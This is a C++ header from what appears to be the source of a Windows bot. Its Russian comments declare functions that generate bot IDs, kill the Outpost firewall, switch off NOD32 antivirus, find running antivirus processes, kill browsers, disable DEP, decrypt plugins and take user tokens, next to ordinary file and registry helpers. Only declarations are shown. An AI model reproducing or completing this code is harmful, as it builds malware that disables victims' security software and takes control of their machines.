
#ifndef UtilsH
#define UtilsH
//----------------------------------------------------------------------------

#include <windows.h>

#include "Strings.h"


#define WIN_2000	1
#define WIN_XP		2
#define WIN_2003	3
#define WIN_VISTA	4
#define WIN_7		5


DWORD GetProcessIdByHash( DWORD dwHash );

//возвращает хеш процесса по пиду
DWORD GetProcessHashOfId(DWORD dwPid);
char *GetProcessList();

HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param ); //запускает поток, но его handle не закрывает, а возвращает
void RunThread( LPVOID lpStartAddress, LPVOID param ); //запускает поток и закрывает его handle
HANDLE OpenProcessEx( DWORD dwHash );
void GetUserToken();

bool RunFileW(PWCHAR FileName);
bool RunFileA(PCHAR FileName, bool wait = false, bool hideConsole = false);


bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread );

//char * FileToMD5(char *URL);

char *GetOSInfo();
LPVOID GetInfoTable( DWORD dwTableType );
void GetOSVersion();

HANDLE CreateUpdateMutex();
DWORD GetCurrentSessionId();

DWORD WINAPI LoadDll( LPVOID lpData );
//DWORD GetFileHash( WCHAR *File );
bool GodmodeOnFile( WCHAR *Filename );


void DisableDEP();
DWORD GetProcessHash();

LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize );
LPVOID DecryptPlugin( LPBYTE Pointer, DWORD dwLen );

// Функция возвращает идентификатор процесса эксплорера (Explorer.exe)
DWORD GetExplorerPid();
// Функция возвращает идентификатор процесса эксплорера (iexplore.exe)
DWORD GetIExplorerPid();


//****************************************************************************
//  Random  методы для генирации случайных чисел
//****************************************************************************
namespace Random
{
	// Инициализировать генератор случайных чисел
	void Initialize();

	// Генерировать случайное число
	DWORD Generate();

	// Генерировать случайное число в диапазоне от Min до Max
	DWORD Generate(DWORD Min, DWORD Max);

	// Генерировать строку случайных символов
	// Min, Max - диапазон генерации символов
	PCHAR  RandomString(DWORD Length, char Min, char Max);
	string RandomString2(DWORD Length, char Min, char Max);
}




void GenerateUid( char *BotUid);


//******************************************************************
//  Функция генерирует уникальный идентификатор машины
//******************************************************************
PCHAR MakeMachineID();



//******************************************************************
//  GenerateBotID - Функция генерирует идентификатор бота
//
//  Результат - Строка созданная функцией StrNew. Уничтожить
//              функцией StrFree
//******************************************************************
PCHAR GenerateBotID();
string GenerateBotID2(const char* Prefix = NULL);

//******************************************************************
//  DirExists - Функция возвращает истину если путь  Path ceotcndetn
//******************************************************************
bool DirExists(PCHAR Path);


//******************************************************************
//  FileExists* - Функция возвращает истину если файл  FileName
//  			  существует
//******************************************************************
bool FileExistsA(const PCHAR FileName);
bool FileExistsW(const PWCHAR FileName);
//проверяют наличие файла по флагу типа CSIDL_APPDATA+FileName или с куском пути folder\file.dlll
bool isFileExists(int FlagFolderDest, WCHAR*Path);
//проверяют наличие файла по флагу типа CSIDL_APPDATA+FileName или с куском пути folder\file.dlll
// то что дальше будет

bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count);
//проверяют наличие файла по флагу типа CSIDL_APPDATA+FileName возвращает его данные
//bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count);

//мочим папку со всеми подпапками
bool DeleteFolders(PCHAR From);

// копируем папку либо файлы по саске, включая поддиректории
bool CopyFileANdFolder(PCHAR From,PCHAR To);
//----------------------------------------------------------------------------
// Функции поиска файлов и директорий
//----------------------------------------------------------------------------

typedef  LPWIN32_FIND_DATA PFindData;

typedef void (* TFilesCallBack)(PFindData Search, // Структура поиска
								PCHAR FileName,   // Имя найденного файла
								LPVOID Data,      // Данные переданные в функцию поиска
								bool &Cancel      // Указание прервать дальнейший поиск
								);

#define FA_ANY_FILES ( FILE_ATTRIBUTE_READONLY |\
					   FILE_ATTRIBUTE_HIDDEN   |\
					   FILE_ATTRIBUTE_SYSTEM   |\
					   FILE_ATTRIBUTE_ARCHIVE  |\
					   FILE_ATTRIBUTE_NORMAL)

#define FA_DIRECTORY FILE_ATTRIBUTE_DIRECTORY

//******************************************************************
//  SearchFiles  - Функция перебирает все  поддиректории
//
//  Path - Пусть с которого начинается поиск. Должен заканчиваться
//         обратным слешем \\
//  Mask - Маска поиска. *.* для всех файлов
//
//  Recursive - Производить рекурсивный поиск
//
//  FileAttributes - Атрибуты искомых файлов
//
//  Data - Данные которые будут переданы в метод обратной связи
//
//  CallBack - метод обратной связи
//
//  Результат - Функция возвращает истину если поиск не был прерван
//              из метода обратной связи
//
//******************************************************************
bool SearchFiles(PCHAR Path, PCHAR Mask, bool Recursive, DWORD FileAttributes,
				 LPVOID Data, TFilesCallBack CallBack);


//******************************************************************
//  GetUniquePID - Функция возвращает реальный идентификатор
//	   текущего процесса. Отличие от GetProcessID() в том, что
//     возвращает корректное значение для дочерних процессов
//******************************************************************
DWORD GetUniquePID();

//возвращает PID родительского процесса
DWORD GetParentPID();

//возращает true, если процесс pid существует
bool IsProcessLeave(int pid);


//******************************************************************
//  IsNewProcess - Функция проверяет идентификатор текущего
//		процесса со значением ProcessID и возвращает истину если
//		они отличаются. В случае отличия значение ProcessID
//      переприсвается.
//
//  Thread - Указатель на переменную, куда будеи записан
//			 идентификатор текущего потока. Не обязателен
//******************************************************************
bool IsNewProcess(DWORD &ProcessID, DWORD *Thread = NULL);


//----------------------------------------------------------------------------
// Registry - методы для работы с реестром Windows
//----------------------------------------------------------------------------

namespace Registry
{
	// создать раздел в реестре пример CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	bool CreateKey(HKEY h, char* path, char* name );

	//корневой ключ, путь без ключа, имя создаваемого значения, значение(заменяет значение REG_SZ)
	bool SetValueString(HKEY h, char* path, char* name,  char* values );
	//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение DWORD)
	bool SetValueDWORD(HKEY h, char* path, char* name,  DWORD values );

	// Функция получает строковое значение из реестра
    PCHAR GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value);

	//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение REG_SZ)
	bool CreateValueString(HKEY h, char* path, char* name,  char* values );
	bool CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise );
	
	// добавляет права SE_BACKUP_NAME для этого открывает токин
	// SetPrivilege(SE_BACKUP_NAME,TRUE); 
	bool SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
	
	// проверяет есть ли ключ
	//первый элемент это ключь: HKEY_CLASSES_ROOT, HKEY_CURRENT_CONFIG,  HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS 
	//второй путь к самому ключу
	//	Вернет  TRUE если да, иначе FALSE
	bool IsKeyExist(HKEY hRoot, LPCSTR KeyPath);
	
	// сохраняет ключь реестра в файл
	// тобишь Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE,"Software\\Policies\\Microsoft","d:\\e.txt");
	bool SaveRegKeyPath(HKEY hRoot, PCHAR SubKey,PCHAR OutFile);
}

//----------------------------------------------------------------------------
// FILE - методы для работы с файлами, именами файлов
//----------------------------------------------------------------------------

namespace File
{
	// Записать данные из буфера в файл
	DWORD WriteBufferA(const char* FileName, const LPVOID Buffer, DWORD BufferSize);
	DWORD WriteBufferW(const wchar_t* FileName, LPVOID Buffer, DWORD BufferSize);

	// Прочитать файл в буфер
	LPBYTE ReadToBufferA(const char* FileName, DWORD &BufferSize);
	LPBYTE ReadToBufferW(const wchar_t* FileName, DWORD &BufferSize);

	// Изменить расширение файла. Касается только строки FileName!!!
	// Примечание - Расширение меняется вместе с точкой
	// Результат - НОВАЯ строка с именем файла
	PCHAR ChangeFileExt(PCHAR FileName, PCHAR Ext);

	// Функции получения имён временных файлов
	PCHAR GetTempNameA();
	string GetTempName2A();

	PWCHAR GetTempNameW();

	//получение имени временного файла с записью в buf
	PCHAR GetTempName( PCHAR buf, const PCHAR prefix = 0 );
	PWCHAR GetTempName( PWCHAR buf, const PWCHAR prefix = 0 );

	//-------------------------------------------------------------------------
	//  Функции извлекают имя файла из полного пути
	//  FileName - полное имя файла, если не содержит разделителей / либо \\
	//  	то функция вернёт всю строку
	//  DuplicateStr - Установить в истину, если необходимо создать
	//		новую строку из результата. В случае false функция вернёт указатель
	//      на первый символ имени в исходной строке
	//-------------------------------------------------------------------------
	PCHAR   ExtractFileNameA(PCHAR FileName, bool DuplicateStr);
    string  ExtractFileNameA(const char* FileName);

	PWCHAR ExtractFileNameW(PWCHAR FileName, bool DuplicateStr);

	//-------------------------------------------------------------------------
	//  ExtractFilePath - функция извлекает имя файла из его полного имени
	//
	//	Результат: В случае успеха функция возвращает новую строку содержащую
	//             путь к файлу
	//-------------------------------------------------------------------------
	PCHAR ExtractFilePathA(PCHAR FileName);


	//------------------------------------------------------
	// GetNameHash - Функция возвращает хэш имени файла
	//
	// FileNAme - Имя файла
	//
	// LowerCase - Приводить символы к нижнему регистру
	//------------------------------------------------------
	DWORD        GetNameHashA(PCHAR FileName, bool LowerCase);
	DWORD inline GetNameHashA(const string& FileName, bool LowerCase) { return File::GetNameHashA(FileName.t_str(), LowerCase); }

	DWORD GetNameHashW(PWCHAR FileName, bool LowerCase);

	inline bool IsExists( const PCHAR FileName )
	{
		return FileExistsA(FileName);
	}
	inline bool IsExists( const PWCHAR FileName )
	{
		return FileExistsW(FileName);
	}

	//------------------------------------------------------
	// LastWriteTime - Функция возвращает время в
	//                 миллисекундах с момента последнего
	//				   изменения файла
	//------------------------------------------------------
	DWORD LastWriteTime(HANDLE File);
}



//Работа с директориями
namespace Directory
{
	//очистка папки вместе с подпапками, если delFolder = true, то удаляет и саму переданную папку, содержимое удаляется безвозратно (в корзину ничего не перемещается)
	bool Clear( const char* folder, bool delFolder = false );
	//удаляет папку вместе с подпапками
	inline bool Delete( const char* folder )
	{
		return Clear( folder, true );
	}
	bool IsExists(const PCHAR Path);
	bool IsExists(const PWCHAR Path);
}


// Для совместимости
#define GetNameHash(FileName) File::GetNameHashW(FileName, true);

//**********************************************************************
//  EnumDrives - Функция перебирает все диски указанного типа
//               используйте DRIVE_UNKNOWN для перебора всех
//               дисков в системе
//**********************************************************************
typedef void (*TEnumDrivesMethod)(PCHAR Drive, LPVOID Data, bool &Cancel8);

void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data);


//-----------------------------------------------------------------------------
//  IsExecutableFile - ыункция возвращает истину если указанный буфер является
//					   исполняемым файлом, либо dll
//-----------------------------------------------------------------------------
bool IsExecutableFile(LPVOID Buf);


// функция добавлена при добавлении оперы
//char   *CalcFileMD5Hash(char *szFileName);
//string CalcFileMD5Hash2(char *szFileName);

char *GetNetInfo();
DWORD GetFileFormat( WCHAR *lpFileName );
void MakeShutdown();
BOOL KillProcess(DWORD pid,DWORD TimeOut );
void KillBlockingProcesses( const char* fileName ); ////уничтожает процессы которые держат указанный файл
bool ClearDirectory(PCHAR Path);
bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir);
//----------------------------------------------------------------------------

typedef int ( WINAPI *fwsprintfA )( LPTSTR, LPCTSTR, ... );
typedef int ( WINAPI *fwsprintfW )( LPWSTR, LPCWSTR, ... );
//возвращает указатель на функцию wsprintf
fwsprintfA Get_wsprintfA();
fwsprintfW Get_wsprintfW();

//ложит в to папку C:\Documents and Settings\All Users
char* GetAllUsersProfile( char* to, int maxSz );
//возвращает путь вида C:\Documents and Settings\All Users\addPath
char* GetAllUsersProfile( char* to, int maxSz, const char* addPath );
//вычисление CRC32
unsigned long GetCRC32( char* data, int size );

//возвращает хеш процесса по его пид
DWORD GetHashForPid( int pid );

//Возвращает true, если размер папки меньше maxSize, иначе false (папка больше заданного размера)
//если указан size, по при возвращении true, там будет размер папки, иначе размер до которого досчитали
bool SizeFolderLess(const char* nameFolder, DWORD maxSize, DWORD* size = 0 );


//------------------------------------------------------------
//  KillAllBrowsers - Функция убивает все запущенные браузеры
//------------------------------------------------------------
void KillAllBrowsers();


//------------------------------------------------------------
//  GetSpecialFolderPath - Функция возвращает путь к
//                          специальной папке системы
//  (Надстройка над ЫРGetSpecialFolderPath)
//
//   FileName - Имя будет добавлено к полученному пути
//------------------------------------------------------------
string        GetSpecialFolderPathA(int CSIDL, const char *FileName);
string inline GetSpecialFolderPathA(int CSIDL, const string &FileName) { return GetSpecialFolderPathA(CSIDL, FileName.t_str()); };
wstring       GetSpecialFolderPathW(int CSIDL, const wchar_t *FileName);


//------------------------------------------------------------
//  KillOutpost - Функция убивает процесс файрвола Outpost
//------------------------------------------------------------
void KillOutpost();


//****************************************************************
//	GetAntiVirusProcessName - Функция возвращает имя процесса
//                            запущенного анти вируса
//****************************************************************
string GetAntiVirusProcessName();

//*****************************************************************
//  GetCommandParamByIndex
//  Получить параметр по индексу из списка параметров команды.
//
//  CommandParamList - строка, которая передается в ф-цию команды (Args)
//  ParamIndex - индекс параметра, который надо получить
//
//  Результат - значение параметра либо пустая строка в случае, если
//              параметра с таким индексом не существует.
//
//*****************************************************************
string GetCommandParamByIndex(const char* CommandParamList, DWORD ParamIndex);


//*****************************************************************
// TryCreateSingleInstance
//
// Ф-ция для создания единственного экземпляра чего-либо.
// Для обеспечения единственности используется захват мьютекса.
// Всякий кто попробует создать и захватить его снова - завершится с таймаутом.
// 
// В случае успешного создания возвращает хендл захваченного мьютекса
// В случае неуспешного захвата возвращает NULL
//
//*****************************************************************

HANDLE TryCreateSingleInstance(const char* MutexPrefix);
//захват мьютекса, wait - сколько ждать в миллисекундах
HANDLE CaptureMutex( const char* name, int wait );
//ждет пока кто-то захватит мьютекс, wait - сколько ждать в миллисекундах
bool WaitCaptureMutex( const char* name, int wait );


BOOL IsUserAdmin();
bool IsUserLocalSystem();

//возвращает PID процесса по его имени
DWORD GetProcessIdByName(PCHAR ProcessName);
//Отключает НОД32
VOID OffNOD32();


//---------------------------------------------------------
//  Функция создаёт ярлык
//  Параметры:
//  	LinkFileName - Имя файла создаваемого ярлыка
//      Object - объект на который будет ссылаться ярлык
//      CommandLine - командная строка для запуска обхекта
//      Description - Описание ярлыка/обхекта
//      IconFileName - Имя файла иконки
//---------------------------------------------------------
void CreateLink( const char* LinkFileName, const char* Object, const char* CommandLine,
						const char* Description, const char* IconFileName );



//---------------------------------------------------------
//  CombineFileName - функция создаёт полное имя файла
//  на осное пути Path и имени файла FileName
//---------------------------------------------------------
string CombineFileName(const char* Path, const char* FileName);



//---------------------------------------------------------
//  IsWIN64 - Функция возвращает истину в случае если,
//  Windows вляется 64 разрядным
//
//  To-Do: В данный момент функция проверяет архитектуру
//         процессора, что даст нам ошибку если на 64 битном
//         железе стоит 32 битная винда. Соответственно
//         необходимо найти нормальный
//---------------------------------------------------------
bool IsWIN64();


//---------------------------------------------------------
//  IsWOW64 - Функция возвращает истину если процесс, PID
//            которого передали, запущен под системой WOW64,
//            что означает запуск 32 битного процесса в 64
//            битной винде
//  Для получения информации о текущем процессе необходимо
//  передать ередать нудевой пид:
//  	IsWOW64(0);
//---------------------------------------------------------
bool IsWOW64(DWORD PID);

//----------------------------------------------------------------------------
#endif
